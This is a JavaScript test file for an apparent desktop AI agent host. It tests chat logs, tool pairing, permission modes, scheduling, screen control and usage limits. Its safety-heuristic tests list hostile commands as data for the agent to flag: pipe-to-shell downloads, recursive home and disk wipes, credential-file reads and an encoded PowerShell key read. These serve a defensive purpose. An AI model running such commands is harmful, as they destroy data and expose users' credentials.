import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

// Isolated state + no real ChatGPT login for every test in this file.
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'minds-test-'));
process.env.MINDS_HOME = path.join(tmp, 'home');
process.env.MINDS_CODEX_AUTH = path.join(tmp, 'no-auth.json');
const ws = path.join(tmp, 'ws'); fs.mkdirSync(ws);
const ctx = { workspace: ws, bot: { name: 'T' }, host: {} };

const { ChatLog } = await import('../src/chatlog.js');
const { buildInput } = await import('../src/agent.js');
const { heuristic, review } = await import('../src/safety.js');
const { PERMISSION_MODES, nextPermission } = await import('../src/permissions.js');
const { Settings } = await import('../src/settings.js');
const { Scheduler } = await import('../src/scheduler.js');
const { TOOLS, toolByName } = await import('../src/tools/index.js');

test('macOS startup escapes paths and preserves the selected data and login', async () => {
  const { launchAgentPlist } = await import('../src/macos.js');
  const plist = launchAgentPlist({ executable: '/opt/Node & Tools/node', hostScript: '/Users/A/Minds & Bots/mindsd.js', dataHome: '/Users/A/Data <private>', authFile: '/Users/A/Login "work".json', searchPath: '/opt/Node & Tools:/usr/bin' });
  assert.match(plist, /<string>\/opt\/Node &amp; Tools\/node<\/string>/);
  assert.match(plist, /<key>WorkingDirectory<\/key><string>\/Users\/A\/Minds &amp; Bots<\/string>/);
  assert.match(plist, /<key>MINDS_HOME<\/key><string>\/Users\/A\/Data &lt;private&gt;<\/string>/);
  assert.match(plist, /<key>MINDS_CODEX_AUTH<\/key><string>\/Users\/A\/Login &quot;work&quot;\.json<\/string>/);
  assert.match(plist, /<key>ELECTRON_RUN_AS_NODE<\/key><string>1<\/string>/);
  assert.match(plist, /<key>PATH<\/key><string>\/opt\/Node &amp; Tools:\/usr\/bin<\/string>/);
  assert.doesNotMatch(launchAgentPlist({ executable: '/usr/bin/node', hostScript: '/tmp/host.js', dataHome: '/tmp/data' }), /MINDS_CODEX_AUTH/);
});
const { Host } = await import('../src/host.js');
const { pickIcon } = await import('../src/icons.js');
const { MODELS, EFFORTS, DEFAULT_MODEL, DEFAULT_EFFORT } = await import('../src/models.js');
const { powerShellArgs, windowsStartupScript } = await import('../src/windows.js');

test('defaults: GPT-6.1 Sol on low; every model supports low..max', () => {
  assert.equal(DEFAULT_MODEL, 'gpt-6.1-sol');
  assert.equal(DEFAULT_EFFORT, 'low');
  assert.deepEqual(EFFORTS, ['low', 'medium', 'high', 'xhigh', 'max']);
  assert.deepEqual(MODELS.map((m) => m.id), ['gpt-6-astra', 'gpt-6.1-sol', 'gpt-6-sol', 'gpt-6-luna']);
});

test('chat log replays adds and patches after reload', () => {
  const f = path.join(tmp, 'log.jsonl');
  const a = new ChatLog(f);
  a.add({ id: '1', type: 'tool', status: 'running' });
  a.patch('1', { status: 'ok', result: 'x' });
  const b = new ChatLog(f);
  assert.equal(b.get('1').status, 'ok');
  assert.equal(b.items.length, 1);
});

test('buildInput pairs tool calls with outputs and marks interrupted ones', () => {
  const items = [
    { id: 'a', ts: 1, type: 'user', text: 'hi' },
    { id: 'b', ts: 2, type: 'assistant', text: 'working', interim: true },
    { id: 'c', ts: 3, type: 'tool', callId: 'call_1', name: 'exec_command', args: { command: 'ls' }, status: 'ok', result: 'file' },
    { id: 'd', ts: 4, type: 'tool', callId: 'call_2', name: 'read_file', args: {}, status: 'running' },
    { id: 'e', ts: 5, type: 'question', question: 'q', status: 'pending' },
  ];
  const input = buildInput(items);
  assert.deepEqual(input.map((i) => i.type), ['message', 'message', 'function_call', 'function_call_output', 'function_call', 'function_call_output']);
  assert.equal(input[3].output, 'file');
  assert.match(input[5].output, /interrupted/);
  assert.match(input[0].content[0].text, /^\[\d{4}-\d\d-\d\d .*\] hi$/);
});

test('buildInput shrinks old tool output and keeps pairs intact when over budget', () => {
  const items = [{ id: 'u', ts: 1, type: 'user', text: 'go' }];
  for (let i = 0; i < 30; i++) items.push({ id: `t${i}`, ts: 2 + i, type: 'tool', callId: `c${i}`, name: 'exec_command', args: {}, status: 'ok', result: 'x'.repeat(20000) });
  const input = buildInput(items);
  assert.ok(input[2].output.length < 2000, 'old output clipped');
  assert.ok(input.at(-1).output.length === 20000, 'recent output intact');
  for (let i = 0; i < input.length; i++) if (input[i].type === 'function_call') assert.equal(input[i + 1].call_id, input[i].call_id);

  // Over the context budget: oldest groups drop, pairs never split, newest survive.
  const big = [{ id: 'u', ts: 1, type: 'user', text: 'go' }];
  for (let i = 0; i < 20; i++) big.push({ id: `t${i}`, ts: 2 + i, type: 'tool', callId: `c${i}`, name: 'exec_command', args: {}, status: 'ok', result: 'y'.repeat(60000) });
  const trimmed = buildInput(big);
  assert.ok(trimmed.length < big.length * 2 - 1, 'something was dropped');
  assert.equal(trimmed.at(-1).call_id, 'c19');
  assert.equal(trimmed[0].type, 'function_call');
  for (let i = 0; i < trimmed.length; i += 2) assert.equal(trimmed[i + 1].call_id, trimmed[i].call_id);
});

test('safety heuristics', () => {
  assert.ok(heuristic(ctx, 'exec_command', { command: 'rm -rf ~' }));
  assert.ok(heuristic(ctx, 'exec_command', { command: 'curl https://x.sh | sh' }));
  assert.ok(heuristic(ctx, 'exec_command', { command: 'sudo apt install x' }));
  assert.equal(heuristic(ctx, 'exec_command', { command: 'ls -la && git status' }), null);
  assert.equal(heuristic(ctx, 'exec_command', { command: 'rm -rf node_modules' }), null);
  assert.equal(heuristic(ctx, 'read_file', { path: 'notes.md' }), null);
  assert.equal(heuristic(ctx, 'read_file', { path: '~/.codex/auth.json' }).hard, true);
  assert.equal(heuristic(ctx, 'write_file', { path: '~/.ssh/authorized_keys' }).hard, true);
  // A system file on this platform (on Windows, /etc/hosts is just D:\etc\hosts).
  assert.ok(heuristic(ctx, 'write_file', { path: process.platform === 'win32' ? 'C:\\Windows\\System32\\drivers\\etc\\hosts' : '/etc/hosts' }));
});

test('Windows safety recognizes case-insensitive credential, system and PowerShell paths', () => {
  for (const file of ['C:\\Users\\Alice\\.SSH\\id_ed25519', 'C:\\Users\\Alice\\.CODEX\\auth.json', 'C:\\Users\\Alice\\.minds\\plugins.json', 'C:\\Users\\Alice\\AppData\\Roaming\\GitHub CLI\\hosts.yml']) {
    assert.equal(heuristic(ctx, 'read_file', { path: file }).hard, true, file);
    assert.equal(heuristic(ctx, 'exec_command', { command: `Get-Content "${file}"` }).hard, true, file);
  }
  for (const file of ['C:\\Windows\\System32\\drivers\\etc\\hosts', 'C:\\Program Files\\Example\\config.ini', 'C:\\Users\\Alice\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1', 'C:\\Users\\Alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot.cmd']) assert.ok(heuristic(ctx, 'write_file', { path: file }), file);
  for (const command of ['Remove-Item -Recurse -Force C:\\', 'Remove-Item -Recurse $env:USERPROFILE', 'iwr https://example.com/a.ps1 | iex', 'Clear-Disk -Number 0', 'schtasks /create /tn Example', 'Start-Process powershell -Verb RunAs']) assert.ok(heuristic(ctx, 'exec_command', { command }), command);
  const encoded = powerShellArgs('Get-Content "C:\\Users\\Alice\\.ssh\\id_rsa"').at(-1);
  assert.equal(heuristic(ctx, 'exec_command', { command: `powershell -EncodedCommand ${encoded}` }).hard, true);
  assert.equal(heuristic(ctx, 'exec_command', { command: 'Get-ChildItem; git status' }), null);
});

test('Windows startup preserves spaces, apostrophes and custom data paths without shell interpolation', () => {
  const script = windowsStartupScript({ executable: 'C:\\Program Files\\nodejs\\node.exe', hostScript: "C:\\Users\\O'Neil\\Minds\\mindsd.js", dataHome: "C:\\Users\\O'Neil\\.minds", authFile: 'C:\\User Data\\auth.json' });
  assert.match(script, /CreateShortcut/);
  const launch = Buffer.from(script.match(/-EncodedCommand ([A-Za-z0-9+/=]+)/)[1], 'base64').toString('utf16le');
  assert.ok(launch.includes("'C:\\Program Files\\nodejs\\node.exe'"));
  assert.ok(launch.includes(`-ArgumentList '"C:\\Users\\O''Neil\\Minds\\mindsd.js"'`));
  assert.ok(launch.includes("$env:MINDS_HOME = 'C:\\Users\\O''Neil\\.minds'"));
  assert.ok(launch.includes("$env:MINDS_CODEX_AUTH = 'C:\\User Data\\auth.json'"));
  assert.ok(launch.includes('-WindowStyle Hidden'));
});

test('permission modes: default screens, ask asks for actions, bypass runs everything', async () => {
  assert.deepEqual(PERMISSION_MODES.map((m) => m.id), ['default', 'ask', 'bypass']);
  assert.equal(nextPermission('default'), 'ask'); assert.equal(nextPermission('ask'), 'bypass'); assert.equal(nextPermission('bypass'), 'default');
  const opts = (mode) => ({ mode, openrouterKey: '', userIntent: '' });
  // default (no OpenRouter key -> local rules only)
  assert.equal((await review(ctx, 'exec_command', { command: 'ls' }, opts('default'))).action, 'allow');
  const risky = await review(ctx, 'exec_command', { command: 'rm -rf ~' }, opts('default'));
  assert.equal(risky.action, 'ask'); assert.equal(risky.safety.safe, false);
  assert.equal((await review(ctx, 'read_file', { path: '~/.codex/auth.json' }, opts('default'))).action, 'ask');
  // ask: every action asks; harmless in-workspace reads and questions do not
  assert.equal((await review(ctx, 'exec_command', { command: 'ls' }, opts('ask'))).action, 'ask');
  assert.equal((await review(ctx, 'write_file', { path: 'a.txt', content: '' }, opts('ask'))).action, 'ask');
  assert.equal((await review(ctx, 'schedule', { action: 'create' }, opts('ask'))).action, 'ask');
  assert.equal((await review(ctx, 'schedule', { action: 'list' }, opts('ask'))).action, 'allow');
  assert.equal((await review(ctx, 'read_file', { path: 'notes.md' }, opts('ask'))).action, 'allow');
  assert.equal((await review(ctx, 'read_file', { path: '/etc/hosts' }, opts('ask'))).action, 'ask');
  assert.equal((await review(ctx, 'ask_user_question', {}, opts('ask'))).action, 'allow');
  // bypass: nothing is checked, not even credential reads
  for (const [t, a] of [['exec_command', { command: 'rm -rf ~' }], ['read_file', { path: '~/.ssh/id_rsa' }], ['write_file', { path: '/etc/x', content: '' }]]) {
    const r = await review(ctx, t, a, { mode: 'bypass', openrouterKey: 'would-be-used-if-checked', userIntent: '' });
    assert.equal(r.action, 'allow'); assert.equal(r.safety.source, 'skipped');
  }
});

test('settings persist only explicit overrides', () => {
  const s = new Settings();
  s.set({ defaultEffort: 'high' });
  assert.equal(JSON.parse(fs.readFileSync(path.join(process.env.MINDS_HOME, 'settings.json'))).defaultEffort, 'high');
  s.set({ defaultEffort: 'low' });
  assert.equal('defaultEffort' in JSON.parse(fs.readFileSync(path.join(process.env.MINDS_HOME, 'settings.json'))), false);
  assert.equal(s.public().openrouterConnected, false);
  assert.equal('openrouterKey' in s.public(), false);
  s.set({ defaultModel: 'nope', defaultPermission: 'weird' });
  assert.equal(s.get().defaultModel, 'gpt-6.1-sol');
  assert.equal(s.get().defaultPermission, 'default');
});

test('file tools: write, read, edit (uniqueness), exec', async () => {
  const t = (n) => toolByName(n);
  await t('write_file').run(ctx, { path: 'sub/a.txt', content: 'one\ntwo\ntwo\n' });
  assert.match(await t('read_file').run(ctx, { path: 'sub/a.txt' }), /1\tone/);
  await assert.rejects(t('edit_file').run(ctx, { path: 'sub/a.txt', old_string: 'two', new_string: '2' }), /matches 2 times/);
  await t('edit_file').run(ctx, { path: 'sub/a.txt', old_string: 'one', new_string: '1' });
  await t('edit_file').run(ctx, { path: 'sub/a.txt', old_string: 'two', new_string: '2', replace_all: true });
  assert.equal(fs.readFileSync(path.join(ws, 'sub/a.txt'), 'utf8'), '1\n2\n2\n');
  const out = await t('exec_command').run(ctx, { command: process.platform === 'win32' ? 'Write-Output hello; (Get-Location).Path; exit 3' : 'echo hello && pwd; exit 3' });
  assert.match(out, /hello/);
  // Windows may report the long form of a short (8.3) temp path, in any case.
  assert.ok([ws, fs.realpathSync.native(ws)].some((p) => out.toLowerCase().includes(p.toLowerCase())), out);
  assert.match(out, /exit code: 3/);
  const slow = await t('exec_command').run(ctx, { command: process.platform === 'win32' ? 'Start-Sleep -Seconds 5' : 'sleep 5', timeout_seconds: 1 });
  assert.match(slow, /timeout/);
});

test('scheduler validates and computes next runs', () => {
  const events = [];
  const s = new Scheduler(() => {}, (e) => events.push(e));
  assert.throws(() => s.create({ botId: 'b', prompt: 'x' }), /exactly one/);
  assert.throws(() => s.create({ botId: 'b', prompt: 'x', cron: 'not a cron' }));
  assert.throws(() => s.create({ botId: 'b', prompt: 'x', at: '2001-01-01T00:00:00Z' }), /past/);
  const cron = s.create({ botId: 'b', name: 'daily', prompt: 'x', cron: '0 9 * * *' });
  assert.ok(Date.parse(cron.nextRun) > Date.now());
  const iv = s.create({ botId: 'b', prompt: 'x', everyMinutes: 30 });
  assert.ok(Math.abs(Date.parse(iv.nextRun) - Date.now() - 30 * 60_000) < 5000);
  assert.equal(s.list('b').length, 2);
  assert.equal(s.remove(iv.id, 'other'), false);
  assert.equal(s.remove(iv.id, 'b'), true);
});

test('icons are distinct per bot', () => {
  const used = [];
  for (let i = 0; i < 40; i++) used.push(pickIcon(used));
  assert.equal(new Set(used.map((i) => `${i.shape}-${i.color}`)).size, 40);
});

test('host: bots are isolated, per-bot model/effort, signed-out greeting', async () => {
  const host = new Host();
  const a = await host.call('bots.create', { name: 'Alpha' });
  const b = await host.call('bots.create', { name: 'Beta', model: 'gpt-6-astra', effort: 'max' });
  assert.equal(a.model, 'gpt-6.1-sol'); assert.equal(a.effort, 'low');
  assert.equal(b.model, 'gpt-6-astra'); assert.equal(b.effort, 'max');
  assert.notDeepEqual(a.icon, b.icon);
  assert.equal(a.permission, 'default');
  await host.call('bots.update', { id: a.id, model: 'gpt-6-luna', effort: 'xhigh', permission: 'bypass' });
  assert.equal(host.view(host.bots.get(a.id)).permission, 'bypass');
  assert.equal(host.view(host.bots.get(b.id)).permission, 'default');
  await assert.rejects(host.call('bots.update', { id: a.id, permission: 'yolo' }), /Unknown permission/);
  assert.equal(host.bots.get(b.id).model, 'gpt-6-astra');
  await assert.rejects(host.call('bots.update', { id: a.id, effort: 'turbo' }), /Unknown effort/);
  await assert.rejects(host.call('bots.update', { id: a.id, model: 'gpt-4' }), /Unknown model/);
  assert.notEqual(host.bots.workspace(a.id), host.bots.workspace(b.id));
  const hist = await host.call('chat.history', { botId: a.id });
  assert.match(hist.items[0].text, /Connect your ChatGPT/);
  await assert.rejects(host.call('chat.send', { botId: a.id, text: 'hi' }), /Sign in to ChatGPT/);
  await host.call('bots.delete', { id: b.id });
  assert.equal(fs.existsSync(host.bots.dir(b.id)), false);
  assert.equal((await host.call('state')).bots.length, 1);
  host.stop();
});

test('view_screen: newest screenshots are attached as images; disabled models get none', async () => {
  const { supportsImages } = await import('../src/agent.js');
  const shots = [1, 2, 3, 4].map((n) => { const f = path.join(tmp, `shot${n}.jpg`); fs.writeFileSync(f, `img${n}`); return f; });
  const items = shots.map((image, i) => ({ id: `s${i}`, ts: i, type: 'tool', callId: `c${i}`, name: 'view_screen', args: {}, status: 'ok', result: 'Screenshot captured', image }));
  const urls = buildInput(items).filter((x) => x.type === 'message').map((m) => m.content.find((c) => c.type === 'input_image').image_url);
  assert.deepEqual(urls, [2, 3, 4].map((n) => `data:image/jpeg;base64,${Buffer.from(`img${n}`).toString('base64')}`));
  assert.equal(buildInput(items, { images: false }).some((x) => x.type === 'message'), false);
  assert.equal(supportsImages({ provider: 'codex' }, {}), true);
  assert.equal(supportsImages({ provider: 'openai' }, { openai: { images: false } }), false);
  assert.equal(supportsImages({ provider: 'openai' }, { openai: { images: true } }), true);
});

test('view_screen: runs without asking and picks a capture command per platform', async () => {
  const { captureCommands } = await import('../src/screen.js');
  for (const mode of ['default', 'ask']) assert.equal((await review(ctx, 'view_screen', {}, { mode })).action, 'allow');
  assert.equal(captureCommands('/s.png', { platform: 'darwin', env: {} })[0][0], 'screencapture');
  assert.equal(captureCommands('C:\\s.png', { platform: 'win32', env: {} })[0][0], 'powershell.exe');
  assert.equal(captureCommands('/s.png', { platform: 'linux', env: { WAYLAND_DISPLAY: 'w', XDG_CURRENT_DESKTOP: 'KDE' } })[0][0], 'spectacle');
  assert.equal(captureCommands('/s.png', { platform: 'linux', env: { DISPLAY: ':0' } })[0][0], 'import');
});

test('attached images: stored on disk, sent with the message, refused for text-only models', async () => {
  const { saveImages } = await import('../src/images.js');
  const png = `data:image/png;base64,${Buffer.from('fakepng').toString('base64')}`;
  const thumb = 'data:image/jpeg;base64,AAAA';
  const [saved] = saveImages(path.join(tmp, 'imgbot'), [{ data: png, thumb }]);
  assert.equal(fs.readFileSync(saved.path, 'utf8'), 'fakepng');
  assert.equal(saved.thumb, thumb);
  assert.equal(saveImages(path.join(tmp, 'imgbot'), [{ data: png, thumb: 'javascript:alert(1)' }])[0].thumb, null);
  assert.throws(() => saveImages(tmp, [{ data: 'data:text/html;base64,AAAA' }]), /Unsupported/);
  assert.throws(() => saveImages(tmp, Array(5).fill({ data: png })), /at most 4/);

  const user = { id: 'u', ts: 1, type: 'user', text: 'what is this?', images: [saved] };
  const [msg] = buildInput([user]);
  assert.deepEqual(msg.content.map((c) => c.type), ['input_text', 'input_image']);
  assert.equal(msg.content[1].image_url, png);
  assert.match(buildInput([user], { images: false })[0].content[0].text, /1 attached image no longer shown/);

  const host = new Host();
  const bot = host.bots.create({ name: 'Local', model: 'm' });
  host.bots.get(bot.id).provider = 'openai';
  await assert.rejects(host.call('chat.send', { botId: bot.id, text: 'hi', images: [{ data: png }] }), /can’t see images/);
});

test('computer: key combos, screenshot coordinates and monitor mapping work the same on every platform', async () => {
  const { parseKeys, keysym, windowsKey, macKeyCode } = await import('../src/computer/keys.js');
  const { locate, toFraction: portalFraction } = await import('../src/computer/portal.js');
  const { toFraction } = await import('../src/tools/computer.js');
  const { backendName } = await import('../src/computer/index.js');
  const { xdoKey } = await import('../src/computer/xdotool.js');
  assert.deepEqual(parseKeys('ctrl+Shift+T Return cmd++'), [['ctrl', 'shift', 't'], ['enter'], ['super', '+']]);
  assert.throws(() => parseKeys('ctrl+bogus'), /Unknown key/);
  assert.equal(keysym('enter'), 0xff0d); assert.equal(keysym('A'), 0x41); assert.equal(keysym('€'), 0x010020ac);
  assert.deepEqual(windowsKey('a'), { vk: 0x41 }); assert.deepEqual(windowsKey('/'), { char: 47 }); assert.equal(macKeyCode('super'), 55);
  assert.equal(xdoKey('pageup'), 'Page_Up'); assert.equal(xdoKey('/'), '0x2f');
  assert.equal(backendName({ platform: 'win32', env: {} }), 'windows');
  assert.equal(backendName({ platform: 'darwin', env: {} }), 'macos');
  assert.equal(backendName({ platform: 'linux', env: { WAYLAND_DISPLAY: 'wayland-0', DISPLAY: ':0' } }), 'portal');
  assert.equal(backendName({ platform: 'linux', env: { DISPLAY: ':0' } }), 'xdotool');
  assert.equal(backendName({ platform: 'linux', env: {} }), null);

  const shot = { size: { width: 1600, height: 900 } };
  assert.deepEqual(toFraction(shot, 0, 899), { fx: 0, fy: 1 });
  assert.throws(() => toFraction(shot, 1600, 10), /outside/);
  // Two monitors side by side: the right half of the desktop lands on the second stream.
  const streams = [{ id: 1, x: 0, y: 0, w: 1920, h: 1080 }, { id: 2, x: 1920, y: 0, w: 2560, h: 1440 }];
  assert.deepEqual(locate(streams, 0.75, 0.5), { stream: 2, x: 4480 * 0.75 - 1920, y: 720 });
  assert.deepEqual(portalFraction(streams, 2240, 720), { fx: 0.5, fy: 0.5 });
});

test('computer: clicks run freely by default, "ask" mode asks, risky typed commands are flagged', async () => {
  for (const action of ['screenshot', 'click']) assert.equal((await review(ctx, 'computer', { action, x: 1, y: 1 }, { mode: 'default' })).action, 'allow');
  assert.equal((await review(ctx, 'computer', { action: 'screenshot' }, { mode: 'ask' })).action, 'allow');
  assert.equal((await review(ctx, 'computer', { action: 'click', x: 1, y: 1 }, { mode: 'ask' })).action, 'ask');
  assert.equal((await review(ctx, 'computer', { action: 'type', text: 'hello' }, { mode: 'default' })).action, 'allow');
  assert.equal((await review(ctx, 'computer', { action: 'type', text: 'sudo rm -rf /' }, { mode: 'default' })).action, 'ask');
});

test('screen overlay: the host finds Electron and the desktop app to draw indicators without the window open', async () => {
  const { overlayCommand } = await import('../src/overlay.js');
  const [bin, args] = overlayCommand({ platform: 'linux' });
  assert.ok(fs.existsSync(bin));
  assert.ok(fs.existsSync(args[0]) && args[0].endsWith('overlay.mjs'));
  assert.deepEqual(args.slice(1), ['--minds-overlay', '--ozone-platform=x11']);
  assert.deepEqual(overlayCommand({ platform: 'win32' })[1].slice(1), ['--minds-overlay']);
});

test('usage: 5-hour and weekly windows, weekly-only plans, and every reset credit listed separately', async () => {
  const { normalizeUsage, normalizeResets, windowLabel, redeemReset } = await import('../src/usage.js');
  const now = 1_000_000_000_000;
  const plus = normalizeUsage({ plan_type: 'plus', rate_limit: { allowed: true, limit_reached: false,
    primary_window: { used_percent: 23, limit_window_seconds: 18000, reset_after_seconds: 60, reset_at: 1791809043 },
    secondary_window: { used_percent: 34, limit_window_seconds: 604800, reset_after_seconds: 120 } }, rate_limit_reset_credits: { available_count: 2 } }, now);
  assert.deepEqual(plus.windows.map((w) => [w.label, w.usedPercent]), [['5-hour', 23], ['Weekly', 34]]);
  assert.equal(plus.windows[0].resetsAt, 1791809043000);
  assert.equal(plus.windows[1].resetsAt, now + 120000);
  assert.equal(plus.resetsAvailable, 2);
  // Pro: no 5-hour window, the weekly one can arrive in either slot.
  for (const rate_limit of [{ primary_window: { used_percent: 5, limit_window_seconds: 604800 }, secondary_window: null }, { primary_window: null, secondary_window: { used_percent: 5, limit_window_seconds: 604800 } }]) {
    assert.deepEqual(normalizeUsage({ plan_type: 'pro', rate_limit }, now).windows.map((w) => w.label), ['Weekly']);
  }
  assert.deepEqual(normalizeUsage({ rate_limit: { limit_reached: true, allowed: false } }).windows, []);
  assert.equal(windowLabel(86400 * 30), '30-day');

  const r = normalizeResets({ available_count: 2, credits: [
    { id: 'RateLimitResetCredit_a', status: 'available', is_supported_by_plan: true, title: 'Full reset' },
    { id: 'RateLimitResetCredit_b', status: 'available', is_supported_by_plan: true, title: 'Full reset' },
    { id: 'RateLimitResetCredit_c', status: 'redeemed', redeemed_at: '2026-10-01T00:00:00Z' },
    { id: 'RateLimitResetCredit_d', status: 'available', is_supported_by_plan: false },
  ] });
  assert.deepEqual(r.credits.map((x) => x.redeemable), [true, true, false, false]);
  await assert.rejects(redeemReset('../../evil'), /Unknown reset credit/);
});

test('usage RPCs stay on this computer: a paired phone cannot read usage or spend resets', async () => {
  const { authorize } = await import('../src/rpc-policy.js');
  for (const m of ['usage.get', 'usage.resets', 'usage.redeem']) { assert.equal(authorize('local', m), true); assert.equal(authorize('mobile', m), false); }
});

test('speed modes: normal, fast (priority tier) and ultrafast; old fast:true bots keep Fast', async () => {
  const { SPEEDS } = await import('../src/providers/codex.js');
  const { botSpeed } = await import('../src/agent.js');
  assert.deepEqual(SPEEDS, { normal: null, fast: 'priority', ultrafast: 'ultrafast' });
  assert.equal(botSpeed({ fast: true }), 'fast');
  assert.equal(botSpeed({}), 'normal');
  assert.equal(botSpeed({ speed: 'ultrafast', fast: true }), 'ultrafast');
  const host = new Host();
  const bot = await host.call('bots.create', { name: 'Speedy' });
  assert.equal(bot.speed, 'normal');
  assert.equal((await host.call('bots.update', { id: bot.id, speed: 'ultrafast' })).speed, 'ultrafast');
  assert.equal((await host.call('bots.update', { id: bot.id, fast: true })).speed, 'fast');
  assert.equal((await host.call('bots.update', { id: bot.id, speed: 'normal' })).speed, 'normal');
  await assert.rejects(host.call('bots.update', { id: bot.id, speed: 'warp' }), /Unknown speed/);
});

test('speed support: every speed is offered until ChatGPT refuses one for a model', async () => {
  const { markUnsupported, speedSupported, unsupportedSpeeds } = await import('../src/catalog.js');
  assert.equal(speedSupported('gpt-6.1-sol', 'ultrafast'), true);
  assert.equal(speedSupported('gpt-6-astra', 'ultrafast'), true);
  assert.equal(speedSupported('gpt-6-sol', 'ultrafast'), false);
  assert.equal(speedSupported('gpt-6-luna', 'ultrafast'), false);
  assert.equal(speedSupported('gpt-6-luna', 'fast'), true);
  markUnsupported('gpt-old', 'ultrafast');
  assert.equal(speedSupported('gpt-old', 'ultrafast'), false);
  assert.equal(speedSupported('gpt-old', 'fast'), true);
  assert.deepEqual(unsupportedSpeeds(), { 'gpt-old': ['ultrafast'] });
  const { authorize } = await import('../src/rpc-policy.js');
  assert.equal(authorize('mobile', 'models.speeds'), true);
});
